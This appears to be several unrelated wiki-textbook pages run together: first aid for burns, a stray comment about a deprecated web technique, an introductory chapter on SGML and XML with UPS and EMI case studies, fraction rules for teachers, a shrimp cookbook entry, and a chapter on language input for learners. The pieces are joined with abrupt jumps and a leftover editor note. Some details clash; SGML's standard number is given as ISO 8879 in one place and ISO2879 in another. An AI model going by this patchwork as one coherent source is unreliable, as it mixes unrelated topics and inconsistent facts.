Burns are sustained by electricity, heat , chemical or radiation (sunburn). There are three levels of burns, including first degree burns (Superficial burn), second degree burns (Partial thickness burn) and third degree burns (Full thickness burn). The first degree burn is typical sunburn with symptoms such as redness of the skin and pain. Second degree often has blisters and severe pain. Third degree can be caused by fires and caustic chemicals. Often the victim will feel no pain because the nerves have been destroyed, even though the skin is deeply charred.

Burns that cover more than ten percent of the body, or are larger than the casualty's palm, are medical emergencies and need to be treated as such. Also ANY burns to the face, hands or groin should be considered critical and require an examination by a physician.

It is deprecated. It won't work in XHTML. 

Noobs will get used to it and have problems understanding that it won't work later in onclick, forms, etc.

There is no difference between using single or double quotes in the exercise at the bottom of the page. Coming to this conclusion is not very educating here, so I'd suggest removing this exercise.

 | '''Learning Objectives'''

* define the purpose of SGML, HTML, and XML
|}


There are four central problems in data management: capture, storage, retrieval, and exchange of data.
The purpose of this book is to address '''XML''', ''a technology for managing data exchange''.  The foundational XML chapters in this book are structured by a 'data model' approach.  The first chapter introduces the reader to the XML document, XML schema, and XML stylesheet with a single entity example.  Subsequent chapters expand upon the XML basics with multiple-entity examples and a one-to-one relationship, a one-to-many relationship, or a many-to-many relationship.

XML is a tool used for data exchange.  Data exchange has long been an issue in information technology, but the Internet has elevated its importance. Electronic data interchange (EDI), the traditional data exchange standard for large organizations, is giving way to XML, which is likely to become the data exchange standard for all organizations, irrespective of size.

[[w:Electronic Data Interchange|EDI]] supports the electronic exchange of standard business documents and is currently the major data format for electronic commerce. A structured format is used to exchange common business documents (e.g., invoices and shipping orders) between trading partners. In contrast to the free form of e-mail messages, EDI supports the exchange of repetitive, routine business transactions. Standards mean that routine electronic transactions can be concise and precise. The main standard used in the United States and Canada is known as  [[w:ANSI_ASC_X12 | X.12]], and the major international standard is [[w:UN/EDIFACT| UN/EDIFACT]]. Firms adhering to the same standard can share data electronically.

The Internet is a global network potentially accessible by nearly every firm, with communication costs typically less than those of traditional EDI. Consequently, the Internet has become the electronic transport path of choice between trading partners. The simplest approach is to use the Internet as a means of transporting EDI documents. But because EDI was developed in the 1960s, another approach is to reexamine the technology of data exchange. A result of this rethinking is XML, but before considering XML we need to learn about SGML, the parent of XML.

==SGML==
For a typical U.S. firm, it is estimated that document management consumes up to 15 percent of its revenue, nearly 25 percent of its labour costs, and anywhere between 10 and 60 percent of an office worker’s time. The '''[[w:Standard Generalized Markup Language|Standard Generalized Markup Language (SGML)]]''' is designed to reduce the cost and increase the efficiency of document management.

A '''[[w:markup_language|markup language]]''' embeds information about a document within the document's text. In the following example, the markup tags indicate that the text contains details of a city. Note also that the city's name, state, and population are identified by specific tags. Thus, the reader—a person or a computer—is left in no doubt as to meaning of ''Athens'', ''Georgia'', or ''100,000''. Note also the latitude and location of the city are explicitly identified with appropriate tags. SGML’s usefulness is based upon both recording text and the meaning of that text.

'''Exhibit 1: Markup language'''

&lt;syntaxhighlight lang=&quot;XML&quot;&gt;
&lt;city&gt; 
       &lt;cityname&gt;Athens&lt;/cityname&gt; 
       &lt;state&gt;GA&lt;/state&gt;
       &lt;description&gt; Home of the University of Georgia&lt;/description&gt;
       &lt;population&gt;100,000&lt;/population&gt;
       &lt;location&gt;Located about 60 miles Northeast of Atlanta&lt;/location&gt;
       &lt;latitude&gt;33 57' 39&quot; N&lt;/latitude&gt;
       &lt;longitude&gt;83 22' 42&quot; W&lt;/longitude&gt;
&lt;/city&gt;
&lt;/syntaxhighlight&gt;

SGML is a vendor-independent [[w:International_Organization_for_Standardization|International Standard]] ([[w:List_of_ISO_standards|ISO]] 8879) that defines the structure of documents.  Developed in 1986 as a [[w:Metalanguage|meta language]], SGML is the parent of both [[w:HTML|HTML]] and [[w:XML|XML]]. Because SGML documents are standard text files, SGML provides cross-system portability. When technology is rapidly changing, SGML provides a stable platform for managing data exchange. Furthermore, SGML files can be transformed for  publication in a variety of media. The use of SGML preserves textual information independent of how and when it is presented. Organizations reap long-term benefits when they can   store documents in a single, independent standard that can then be converted for display in any desired media.

SGML has three major advantages for data management:
*'''Reuse''': Information can be created once and reused many times.  
*'''Flexibility''': SGML documents can be published in any format. The same content can be printed, presented on the Web, or delivered with a text synthesis. Because SGML is content-oriented, presentation decisions can be delayed until the output format is decided. 
*'''Revision''': SGML supports revision and version control. With content version control, a firm can readily track the changes in documents. 

A short section of SGML demonstrates clearly the features and strength of SGML (see Exhibit 2). The tags surrounding a chunk of text describe its meaning and thus support presentation and retrieval. For example, the pair of tags &lt;airline&gt; and &lt;/airline&gt; surrounding “Delta” identify the airline making the flight.

'''Exhibit 2: SGML example'''

&lt;syntaxhighlight lang=&quot;XML&quot;&gt;
   &lt;flight&gt;
       &lt;airline&gt;Delta&lt;/airline&gt;
       &lt;flightno&gt;22&lt;/flightno&gt;
       &lt;origin&gt;Atlanta&lt;/origin&gt;
       &lt;destination&gt;Paris&lt;/destination&gt;
       &lt;departure&gt;5:40pm&lt;/departure&gt;
       &lt;arrival&gt;8:10am&lt;/arrival&gt;
   &lt;/flight&gt;
&lt;/syntaxhighlight&gt;

The preceding SGML code can be presented in several ways by applying a [[w:Style_sheet_(web_development)|style sheet]] to the file. For example, it might appear as

Delta flight 22 flies from Atlanta to Paris leaving 5:40pm and arriving 8:10am

or as

{| width=&quot;100%&quot; border=&quot;1&quot; bgcolor=&quot;lightgreen&quot;
|-
| align=&quot;left&quot; bgcolor=&quot;#ffff66&quot; | &lt;font color=&quot;black&quot;&gt;Airline&lt;/font&gt;
| align=&quot;left&quot; bgcolor=&quot;#ffff66&quot; | &lt;font color=&quot;black&quot;&gt;Flight&lt;/font&gt;
| align=&quot;left&quot; bgcolor=&quot;#ffff66&quot; | &lt;font color=&quot;black&quot;&gt;Origin&lt;/font&gt;
| align=&quot;left&quot; bgcolor=&quot;#ffff66&quot; | &lt;font color=&quot;black&quot;&gt;Destination&lt;/font&gt;
| align=&quot;left&quot; bgcolor=&quot;#ffff66&quot; | &lt;font color=&quot;black&quot;&gt;Departure&lt;/font&gt;
| align=&quot;left&quot; bgcolor=&quot;#ffff66&quot; | &lt;font color=&quot;black&quot;&gt;Arrival&lt;/font&gt;
|-
| align=&quot;left&quot; | Delta
| align=&quot;left&quot; | 22
| align=&quot;left&quot; | Atlanta
| align=&quot;left&quot; | Paris
| align=&quot;left&quot; | 5:40pm
| align=&quot;left&quot; | 8:10am
|}


If the data are stored in HTML format and rendered on a Web site (as in Exhibit 3), then the meaning of the data has to be inferred by the reader. This is generally quite easy for humans, but impossible for machines. Furthermore, the presentation format is fixed and can only be altered by rewriting the HTML. If you are not familiar with HTML, you should read the WikiBooks chapter on [[XML - Managing Data Exchange/XHTML|XHTML]], an extension of HTML, before reading the next chapter.

'''Exhibit 3: HTML rendering example'''
&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
&lt;pre&gt;&lt;nowiki&gt;
    Delta flight 22 flies from Atlanta to Paris leaving 5:40pm and arriving 8:10am
&lt;/nowiki&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

'''Meaning and presentation should be independent''', and this is an important reason why SGML is more powerful than HTML.

&lt;blockquote style=&quot;background: linen; border: 1px solid black; padding: 1em;&quot;&gt;
SGML is a markup language that defines the structure of documents and is preferred to HTML as it can be transformed into a variety of media.
&lt;/blockquote&gt;

==XML==

Many computer systems contain data in incompatible formats. A time-consuming challenge is to exchange data between such systems. XML is a generic data storage format that comes bundled with a number of tools and technologies that should make it easier to exchange specific XML 'applications' between incompatible systems. Since XML is open and generic, it is expected that as time progresses, more and more organizations and people will jump onto the XML bandwagon, both developers and data users. This should make XML the ultimate viable technology for certain types of data exchange.

XML is used not only for exchanging information, but also for publishing Web pages. XML's very strict syntax allows for smaller and faster Web browsers and as such is well suited for use with [[w:Personal_digital_assistant|Personal Digital Assistants]] (PDAs) and [[w:Mobile_phone|cellphones]].  [[w:Web_browser|Web browsers]] that interpret HTML documents, on the other hand, are bloated with programming code to compensate for HTML’s not so strict coding.  

The types of data generally well suited for encoding as XML are those where field lengths are unknown and unpredictable and where field contents are predominantly textual. 

An [[XML - Managing Data Exchange/Data_schemas|XML schema]] allows for the exchange of information in a standardized structure.  A schema defines custom markup tags that can contain attributes to describe the content that is enclosed by these tags.  Information from the tagged data in the XML document can be extracted using an application called a “parser”, and with the use of an XML stylesheet the data can be formatted for a Web page.

XML's power lies in the combination of custom markup tags and content in a defined XML document.  The purpose of eXtensible Markup Language (XML) is to make information self-describing. Based on SGML, XML is designed to support electronic  commerce.  The definition of XML, completed in early 1998 by the [[w:World_Wide_Web_Consortium|World Wide Web Consortium]] (W3C), describes it as a meta language — a language to generate languages. XML should steadily replace HTML on many Web sites because of some key advantages. The major differences between XML and HTML are captured in the following table.

'''Exhibit 4: XML vs HTML'''

{| align=&quot;center&quot; cellspacing=10
 |- align=&quot;center&quot;

 | Information content
 | Information presentation
 |-
 | Extensible set of tags
 | Fixed set of tags
 |-
 | Data exchange language
 | Data presentation language
 |-
 | Greater hypertext linking
 | Limited hypertext linking
 |}


The eXtensible in XML means that a new data exchange language can be created by defining its structure and tags.  For example, the [http://www.opengis.org/ OpenGIS Consortium] designed a [[w:Geography_Markup_Language|Geography Markup Language]] (GML)  to facilitate the electronic exchange of geographic information. Similarly, the [http://www.opentourism.org Open Tourism Consortium] is working on the definition of TourML to support exchange of tourism information. The insurance industry uses data corresponding to the XML based standard [http://www.acord.org ACORD] for electronic data exchange. Another good example of XML in action is [http://www.newsml.org NewsML&amp;trade;].

In this text we will cover all the features of XML, but at this point let us introduce a few of the key features.


&lt;div style=&quot;background: linen; border: 1px solid black; padding: 1em; width: 80%; margin-left:auto; margin-right:auto;&quot;&gt;
'''Applications of XML''':

Before we start learning more about how an XML document is structured, let us point out what XML can be used for. The four major implementations of XML are:

'''Publication''': Database content can be converted into XML and afterwards into HTML by using an [[w:XSL_Transformations|XSLT]] stylesheet. Making use of this technique, complex websites as well as print media like PDF files can be generated. Information no longer has to be stored in different formats (i.e. RTF, DOC, PDF, HTML). Content can be stored in the neutral XML format and then, using appropriate layout style sheets and transformations, brochures, websites, or datalists can be generated (See more in [[XML - Managing Data Exchange/Database and XML|Chapter 17]].)

An example of the capability of XML and XSLT can be found at http://www.emimusic.de: This website contains approximately 20,000 pages with profiles of the artists, their products and the titles of the songs. These pages are generated using a XSLT script. Based on the script used it will also be possible to create a catalog in PDF format. Please see below for more details.

'''Interaction''': XML can be used for accessing and changing data interactively. This man&lt;-&gt;machine communication usually happens via a web browser (see [[XML - Managing Data Exchange/Cocoon|Chapter 12]]).

'''Integration''': Using XML, homogenous and heterogenous applications can be integrated. In this case, XML is used to describe data, interfaces, and protocols. This machine-machine communication helps integrate [[w:Relational_database|relational databases]] (i.e. by importing and exporting different formats).

'''Transaction''': XML helps to process transactions in applications like online marketplaces, supply chain management, and e-procurement systems.

&lt;/div&gt;

===Key features of XML===
* Elements have both an opening and a closing tag
* Elements follow a strict hierarchy, with documents containing only one root element
* Elements cannot overlap other elements
* Element names must obey XML naming conventions
* XML is case sensitive

XML will improve the efficiency of data exchange in several important ways, which include:
* '''write once and format many times:''' Once an XML file is created it can be presented in multiple ways by applying different XML stylesheets. For instance, the information might be displayed on a web page or printed in a book.
* '''hardware and software independence:''' XML files are standard text files, which means they can be read by any application.
* '''write once and exchange many times:''' Once an industry agrees on a XML standard for data exchange, data can be readily exchanged between all members using that standard.
* '''Faster and more precise web searching:''' When the meaning of information can be determined by a computer (by reading the tags), web searching will be enhanced. For example, if you are looking for a specific book title, it is far more efficient for a computer to search for text between the pair of tags &lt;booktitle&gt; and &lt;/booktitle&gt; than search an entire file looking for the title. Furthermore, spurious results should be eliminated.

===10 reasons to use XML===
# XML is a widely accepted open standard.
# XML allows to clearly separate content from form (appearance).
# XML is text-oriented.
# XML is extensible.
# XML is self-describing.
# XML is universal; meaning internationalization is no problem.
# XML is independent from platforms and programming languages.
# XML provides a robust and durable format for information storage.
# XML is easily transformable.
# XML is a future-oriented technology.

===The major XML elements===
The major XML elements are:
* '''XML document''': An XML file containing XML code.
* '''XML schema''': An XML file that describes the structure of a document and its tags.
* '''XML stylesheet''': An XML file containing formatting instructions for an XML file.
In the next few chapters you will learn how to create and use each of these elements of XML.

=== Creating a markup file ===
Any text editor can be used to create a markup file (e.g. an HTML file). In this book, we use the text editor within [[w:NetBeans|NetBeans]], an open source [[w:Integrated_development_environment| Integrated Development Environment (IDE)]] for Java, because NetBeans supports editing and validation of XML files. Before proceeding, you should download and install NetBeans from http://www.NetBeans.org/.

The examples in this book use NetBeans to illustrate proper XML code.  For an alternative to NetBeans, see [[../Exchanger XML Lite/]]

==Case Studies in XML Implementation==

===XML at United Parcel Service (UPS)===
“UPS is a service company and it is all about scale and speed,” says Geoff Chalmers, Project Leader at UPS eSolutions Department.  In 2003, UPS had $33.5 billion annual revenue and 357,000 employees worldwide.  Six percent of the United States' Gross Domestic Product (GDP) on any given day is in the UPS system.

UPS uses technology extensively.  The Information Systems department employs 4,000 people.  The company's web site has 166 different country home pages and is supported by 44 applications.

UPS delivers around 13 million packages every day, and customers can track these shipments via the UPS Web site, which receives around 200 million hits daily.  Nineteen of the applications within ups.com are XML OnLine Tool ([[w:Web service|Web services]]) applications.

UPS’s online tools are developed specifically to be integrated with customers’ applications.  This makes the customer’s task simpler, easier, and faster.  UPS verified the importance of simplicity and speed, via “[http://www.ups.com/content/us/en/bussol/offering/technology/automated_shipping/pbm.html CampusShip],” a product that has been one of the UPS’s most successful in the last 10 years.  UPS CampusShip® is a Web-based, UPS-hosted shipping system.  Using an Internet connection, employees can ship their own packages and letters from any desktop, while management maintains overall control of shipping activities.  UPS CampusShip® allows simultaneous shipper autonomy and managerial cost-control within the organization. This product has been successful because no installation or software maintenance is required and it is quick to implement.  XML Online Tools enabled cheap and fast evolution of CampusShip®.

UPS favors XML especially because it is agnostic; platform and language independent.  These features make XML very flexible and powerful.  It is also decoupled and scalable. XML has enabled UPS to target a broader market and reduce customer interaction, and thus the cost of customer service. Another positive feature of XML is that it is backward compatible.  The adoption of XML has reduced maintenance, implementation, and usage costs significantly within UPS.

However these advantages don’t come without a price.  “XML is inefficient in so many ways” says Chalmers.  XML unfortunately takes more CPU and bandwidth than the other technologies.  Yet bandwidth and CPU are cheap and getting cheaper everyday, so this is a gradually disappearing problem.

Nevertheless, Chalmers also thinks that XML doesn’t work well in databases.  He says that it is too wordy and it is an exchange medium rather than a database medium. There were some early attempts to tightly integrate XML and databases.  Because databases do supply structure and identification to data as does XML, the value-add of XML-database integration is limited to applying hierarchical structure.   On the other hand, if data is to be stored as a blob, then XML makes sense.  Another problem that he points out about XML is that business rules cannot be expressed in XML schemas.

Finally, raw XML programming and debugging can be challenging.  Therefore, UPS’s enterprise customers are starting to explore the code generators and embedded facilities to be found in [[w:Microsoft_.NET|.NET]] and [[w:BEA_Services|BEA]].  However, hand coding by experienced in-house engineers is a must for the high availability, scalability, and performance that UPS requires for the UPS OnLine Tools.

===XML at EMI Music===

'''How is it used?'''

EMI Music Germany GmbH &amp; Co. KG, a famous German record label, displays information about the artists it is affiliated with  [http://www.emi.de/ on its website]. Visitors are able to explore all their audio or video productions.
The whole website consists of nearly 20,000 pages that contain information about artists and their products (CD, DVD, LP). Everything is properly linked and systematically grouped.

After all, there is data to be provided for every artist, albums, samples, pictures, descriptions or article codes. The site is updated on a daily basis and is subject to change by a web editor whenever it’s necessary. Now this is a fairly complex and large amount of data to be handled.

This is where XML comes into play. The data, which is stored in a database, has been transformed into XML code. Now an XSLT stylesheet converts this data into HTML code, which can be easily read by any web browser (e.g. Internet Explorer or Firefox).

'''What's the benefit?'''

The advantage of XML is that the programming effort is considerably lower as compared to other formats. This is because XML lies at the point of intersection of XSLT and HTML.

It’s also no problem for the web editor to update the website. Using XML makes it easy for the person in charge to deal with this large amount of data.

'''Going beyond…'''
On the basis of the XML scripts thus far produced by EMI Music, the company could easily produce a PDF-formatted catalog or design i-Mode pages for the current mobile phone generation. Thanks to XML, this can be done with little extra effort.

==A brief history of XML==
In the late 60s Charles Goldfarb, Raymond Lorie and Edward Mosher all working for IBM started to develop GML (Generalized Markup Language), a text formatting language. The language was successfully applied for internal documentation procedures. As it used to be common, the document editing was performed in the batch-mode. GenCode, another procedure to define generic formatting codes for the typesetting systems of various software producers, was developed by the GCA (Graphic Communications Association) at about the same time. Both of these technologies, GML syntactically and GenCode semantically, served as basis for the development of SGML (Standard Generalized Markup Language). The process of standardization started at the U.S. Standardization institute ANSI in the early 80s and in 1986 SGML finally passed as ISO standard ISO2879:1986.

SGML is reckoned to be a complex and comprehensive language (the specification extends 500 pages). However, the success of HTML (Hyper Text Markup Language) proved that the concepts of SGML were appropriate. SGML-based HTML was developed by [[w:Tim Berners-Lee|Tim Berners-Lee]] in Geneva, in the early 90s in order to illustrate and link documents in the Internet. Meanwhile, HTML developed as the most successful format for all electronical documents. The Internet was originally designed as a space for human-human and human-machine communication but lately machine-machine communication has gained tremendous importance, putting a completely new challenge on the computer languages used. 

HTML is a descriptive language for the presentation of documents. The main focus is on the presentation, meaning that an HTML-document mixes the presented data and its formatting instruction. A human being may recognize the displayed semantic by means of the presentation and the context meaning; a machine or (better-said) software is unable to.

In 1996 a team under the guidance of Jos Bosak attending the W3C-consortium was established to make SGML web-suitable. The result was a 30-page specification, which received in February 1998 the status of a  &quot;W3C-recommendation&quot; and was named &quot;Extensible Markup Language (XML)&quot;. 

The most important goals developing XML were:
* XML should be compatible with SGML
* XML should be easy to use in the Internet
* The number of optional characteristics should be minimized 
* XML-documents should be easy to generate and human-readable 
* XML should be supported by a variety of application 
* It should be easy to write programs for XML
* XML should be put into practice on time

In the terminology of markup languages, a description formulated in XML is called a XML-document, albeit the content has nothing to do with text processing.

==Why is this book not an XML document?==
If you have accepted the ideas presented in this chapter, the question is very pertinent. The simple answer is that we have been unable to find the technology to support the creation of an open text book in XML. We need several pieces of technology
* An XML language for describing a book. [http://www.docbook.org/ DocBook] is such a language, but the structure of a book is quite complex, and DocBook (reflecting this complexity) cannot be quickly mastered
* A Wiki that works with a language such as DocBook
* A XML stylesheet that converts XML into HTML for displaying the book's content

There is a project to create [http://wiki.wikiml.org/index.php?WikiMl WikiMl] (Wiki MarkupLanguage), and this might be used at some point.

== Working with fractions ==

Mixed numbers and top heavy fractions:

A mixed number is an integer and a fraction, eg 2 and a half, a top heavy fraction is a fraction with a larger numerator than demominator, eg 3/2.  For multiplication and division you must not use mixed numbers.  They can be used in addition and subtraction (do the integers and fractions seperately and combine the result) if this is not too confusing.

Simplest terms:
Multiplying (or dividing) the numinator and denominator by the same number will not change the fraction.  A fraction is put into its simplest terms by dividing both by the largest integer that goes into both a whole number of times, this can be done in stages using small integers such as 2 and 3, 5 and 10 repeatedly.

Multiplication:

 &lt;math&gt;\frac{a}{c}*\frac{b}{d} = \frac{ab}{cd}&lt;/math&gt;

Where ab=a*b.  

Division:

To divide fractions; remember that a fraction &lt;b&gt;is&lt;/b&gt; a division.  Fractions can be stacked like so:

 &lt;math&gt;\frac{\frac{a}{b}}{\frac{c}{d}}&lt;/math&gt;

The rule to remember to simplify is that anything under an odd number of lines goes on the bottom and anything under an even number of lines goes on the top (0 is even for this purpose) thus:

 &lt;math&gt;\frac{ad}{bc}&lt;/math&gt;

It is easier (perhaps) to remember that the the second fraction in the division gets turned upside down.


Addition and subtraction:

For addition the denomintators of the two fractions must be the same - if this is so then simply add (or subtract) the numerators:


 &lt;math&gt;\frac{a}{b}+\frac{c}{b} = \frac{a+c}{b}&lt;/math&gt;

If the denominators are not the same then a common denominator must be found, the simplest way to do this is take the product of the denominators allthough if one is a multiple of the other simply multiplying it by the aplicable integer works aswell.  Remember to multiply the numerators by the same number.  In general:

 &lt;math&gt;\frac{a}{b}+\frac{c}{d} = \frac{ad+cb}{bd}&lt;/math&gt;


But for example

 &lt;math&gt;\frac{a}{5}+\frac{b}{10} = \frac{2a+b}{10}&lt;/math&gt;

Is possible.

Remember that young children will not understand the algebraic formulation here.  The art of primary teaching is finding a way to make this make sense to young children. However, teachers need to know these general rules.

'''Shrimp''' and '''prawns''' are crustaceans, related to [[Cookbook:Lobster|lobster]], [[Cookbook:Crab|crab]], [[Cookbook:Crayfish|crayfish]], and [[Cookbook:Krill|krill]]. Prawns are not shrimp, but are generally indistinguishable in culinary usage; see the recipes listed below for details.

To remove the shells, start by pinching away the leg-like gill structure. Then split the shell from there, pulling it off the rest of the way. You may wish to remove the &quot;vein&quot; on the back, which is actually the digestive tract. If the shrimp are already deveined, they will be split along the back, and a good way to peel them is to simply squeeze forefinger and thumb against the tail. This will push the &quot;meat&quot; out and allow you to easily pluck off the remnants of the shell. Of course, this results in tail-less shrimp.

The easiest way to cook shrimp is by [[Cookbook:Boiling|boiling]]. Simply place them into a pot of boiling water and cook them until they change color, generally becoming pink. You can serve the shrimp with [[Cookbook:Lemon Juice|lemon juice]], [[Cookbook:Ketchup|ketchup]], a mixture of both, or a fancier [[Cookbook:Cocktail Sauce|cocktail sauce]].

Shrimp also go well in [[Cookbook:Stir-fry|stir-fry]], including [[Cookbook:Fried Rice|fried rice]].

A more difficult and dangerous [[Cookbook:Deep Fat Frying|deep fat frying]] procedure can be used to produce [[Cookbook:Fried Shrimp|fried shrimp]]. There are several types including [[Cookbook:Southern Fried Shrimp|Southern fried shrimp]] (non-puffy batter containing [[Cookbook:Cornmeal|cornmeal]]) or [[Cookbook:Chinese Fried Shrimp|Chinese fried shrimp]] (puffy cornmeal-free batter, as used in westernized [[Cookbook:Cuisine of China|Chinese]] cooking), and [[Cookbook:Tempura|tempura]] (thin and sometimes flakey [[Cookbook:Cuisine of Japan|Japanese]] style).

The shells and tails from peeled shrimp can be used to make a stock. Simply place the shells and tails in a pot with a small amount of water, bring to a boil, then cover and simmer while you prepare the rest of the dish. This stock can then be used to flavour the dish, and/or used as a component of the cooking liquid to make shrimp-flavoured rice.

:'''''The concept of input is perhaps the single most important concept of second language acquisition. . . . In fact, no model of second language acquisition does not avail itself of input in trying to explain how learners create second language grammars''''' (Gass, 1997, p. 1)

:'''''We cannot ignore the fact that learners need access to abundant amounts of comprehensible input in order for acquisition to happen.''''' (Wong, 2005, p. 34)

== Introduction ==
While there is disagreement among [[metawikipedia:wikipedia:Second_language_acquisition | second language acquisition (SLA)]] researchers and theorists concerning many aspects of SLA, there is quite broad consensus on the obvious importance of input in acquiring a FL. That is, in order for spoken and/or written competence in a FL to be acquired, the language must be encountered in spoken and/or written form.

In addition, there is increasing evidence that the amount of input, that is, the frequency with which various forms of language are encountered is an important determining factor in SLA. Ellis (2002) has reviewed how several aspects of language acquisition, including phonology, orthography, vocabulary, morphology, and syntax, depend on the frequency of exposure.  This is also the case for first language acquisition as it has been shown that native English speakers take less time to produce the past tense form of frequent irregular verbs (e.g., went) compared to less frequent irregular verbs (e.g., slung) (Prasada, Pinker, et al., 1990; Seidenberg &amp; Bruck 1990).

Ellis (2002) summarizes the importance of input frequency in language acquisition thus:

:For language learners to be accurate and fluent in their generalizations they need to have processed sufficient exemplars that their accidental and finite experience is truly representative of the total population of language of the speech community in terms of its overall content, the relative frequencies of that content, and the mappings of form to functional interpretation.  The enormity of the lexical pool, the range of frequencies from 60,000 per million down to 1 per million and below, and the wide range of different linguistic constructions, when considered from the point of view of sampling theory, makes it clear that the necessary representative experience for fluency must be vast indeed. (p. 167)

So the case has been made that language learners need considerable exposure to the target language if they hope to attain any useful degree of fluency in it.  And it becomes less of a puzzle to understand why FL learners, particularly those who attempt to acquire a FL in settings lacking extensive exposure to the language, typically fall far short of anything approaching native speaker fluency in their FL. &lt;&lt;add Cummins info here about hours of exposure in traditional and immersion classes&gt;&gt;

If frequent exposure to a FL is necessary for its acquisition, the question then arises as to the kind of input that is best for developing proficiency.  One well known and highly influential (and controversial) answer to this question has been provided by Krashen in a series of articles and books on SLA theory and practice (Krashen, 1981, 1982, 1985, 1992, 1994, 1997). Krashen’s theory of SLA consists of five major hypotheses, the one of most relevance here being the Input Hypothesis (Krashen, 1981, p. 100).  The Input Hypothesis states that in order for language acquisition to occur, the input must have an appropriate degree of difficulty.  The appropriate level of difficulty, according to Krashen, is what he calls level i + 1, that is, just a bit beyond the learner’s current ability (i), but not so difficult to seriously impair comprehension nor so easy that no new language challenges are encountered.  By encountering a constant but small proportion of new language forms among familiar ones in a meaningful, communicative context, the learner is able to infer the meaning and function of the new forms using the linguistic and extralinguistic context provided by the situation.

All of Krashen’s hypotheses about SLA have been criticized by other SLA theorists and researchers over the last quarter-century, including his Input Hypothesis.  Concerning the latter, it has been noted that there is no clear way to know what i + 1 would be for any particular learner (Gregg, 1984; White, 1987) and no way to make sure a learner is exposed to input at i + 1 rather than i + 0 (too easy) or i + 2 (too hard).  But in spite of these problems, it is nonetheless the case that the notion of i + 1 enjoys general acceptance in many fields of learning, such as Ausubel’s (1963) theory of verbal learning and Vygotsky’s (1978) Zone of Proximal Development to account for the development of higher mental skills.  The matching of a task’s challenge to the learner’s skill is also an important component of the Flow Theory as developed by Csikszentmihalyi (see Egbert, 2003).  Ways of exposing language learners to i + 1 input will be considered later below.

The field of SLA has gone through many changes since sustained scientific study of the acquisition, learning, and teaching of second languages began in the 1950s.  While much work still needs to be done in the field and much disagreement remains concerning many key aspects of second language acquisition, learning, and teaching, there appears to be a developing consensus concerning the necessary and optimal conditions for acquiring a second language as an adult.  Necessary (if not sufficient) conditions include lots of comprehensible input in aural and/or written form, at least some of which is slightly beyond the linguistic ability of the learner, but still largely comprehensible given the linguistic and extralinguistic context and the learner’s real-world knowledge.  We will now explore the ways in which the Internet can be used to provide such input to autonomous second language learners.

== Text ==

Without a doubt, the most important recent technological development for accessing foreign languages in text form is the Internet and World Wide Web.  Before the global spread of the Internet, it was difficult or impossible in many places in the world to find interesting reading material in foreign languages.  Today, anyone within reach of the Web has quick and easy access to a vast amount of texts in almost all of the world's languages.

In this section an overview of interesting texts in foreign languages available on the Web will be provided as well as ideas for making these texts understandable and accessible.

=== Books and Documents ===

====Multiple Languages====

[[metawikipedia:wikipedia:Project Gutenberg | Project Gutenberg]] [http://www.gutenberg.org]. Although we may usually think of the World Wide Web as the largest repository of text-based language materials, the use of the Internet as a means to disseminate texts actually began many years before the Web came into existence.  In 1971, Michael Hart began Project Gutenberg in order to make books freely available to the world’s readers.  As of August, 2006, Project Gutenberg has made over 19,000 public domain books available to anyone with an Internet connection.  Although the majority of these books are in English, 24 other languages are also represented including Bulgarian, Chinese, Danish, Dutch, Esperanto, Finnish, French, German, Greek, Hebrew, Hungarian, Italian, Japanese, Latin, Lithuanian, Polish, Portuguese, Russian, Sanskrit, Slovak, Spanish, Swedish, Welsh, and Yiddish.

Due to copyright restrictions, Project Gutenberg includes only older books, usually those first published before 1930.  Nonetheless, Project Gutenberg  is a useful resource for anyone interested in obtaining older and classic books in the languages mentioned above that can be read on a computer monitor or printed out.

=== Comic strips and comic books ===

Comic strips and comic books available on the web are variously referred to as [[wikipedia:Webcomic | webcomics]], web comics and online comics. They include both comics available only online as well as web versions of printed and syndicated comics

By pairing text with illustrations and treating varied themes ranging from inane comedy to graphic violence, webcomics provide an valuable if perhaps unused means of developing proficiency in a foreign language and are particularly valuabe to exposing learners to modern, vernacular forms of the language.

=== Encyclopedias ===

==== Multilingual ====

[http://www.wikipedia.org '''Wikipedia'''] is the &quot;free-content encyclopedia that anyone can edit&quot; with reference articles in over 100 languages.  It has over 1,000,000 articles in [[metawikipedia:wikipedia:Main Page | English]] and over 50,000 articles in [http://de.wikipedia.org German], [http://fr.wikipedia.org French], [http://ja.wikipedia.org Japanese], [http://nl.wikipedia.org Dutch], [http://pl.wikipedia.org Polish] and [http://sv.wikipedia.org Swedish]. For learners of English, there are over 3,000 articles in [http://simple.wikipedia.org Simple English].  Wikipedia has particularly good coverage of topics relating to information technology.

Because Wikipedia articles exist in many languages and anyone may edit them, language students may do more with the articles than just use them as sources of input.  For example, Chinese students studying English reading may find it useful to translate Wikipedia articles that exist in English into Chinese and thereby contribute to the Chinese-language version of the Wikipedia.  Or, Chinese students focusing on English writing may choose instead to translate Chinese-language Wikipedia articles into English, or create new articles in the English-language Wikipedia about their city or college or important people in their community and thereby contribute to the Chinese cultural content of the English-language Wikipedia. While Wikipedia editing lends itself easily to group work, by requiring students to logon using their name or ID, teachers can see the contribution of each student as well as see all changes and additions each student has made.  That native speakers of the target language may make additional changes is something that the students can watch for (using a &quot;my watchlist&quot;) to see how their writing is corrected.

==== Spanish ====

*[http://www.kalipedia.com '''Kalipedia'''] Kalipedia is a free, online, Spanish-language encyclopedia oriented toward secondary education begun on 16 October 2007. It is published by Grupo Santillana which is owned by Grupo Prisa. Its content is controlled centrally, but users can make suggestions for corrections.

=== Monolingual and Bilingual Dictionaries, Thesauruses, Translators and Concordance Tools ===

Foreign language readers of texts written for native speakers will surely encounter many words and phrases whose meaning they can only guess.  While inferring the meaning of new words and phrases based on context and knowledge of the subject matter is a good skill for foreign language readers to develop, there are times when a reader may want or need to find a definition using either a monolingual dictionary or a FL to L1 translation dictionary.  Fortunately, there are many such dictionaries available at no cost on the Web.

====Multilingual====

*The '''WordTranslator''' option of the [http://toolbar.google.com Google Toolbar] for the [[wikipedia:Firefox | Firefox]] and [[wikipedia:Internet Explorer| Internet Explorer]] web browsers provides mouse-over translations of English words into Chinese (traditional and simplified), French, German, Italian, Japanese, Korean and Spanish. No non-English to English-language translations are provided, however, so this feature is useful primarily for readers of English as a second language.

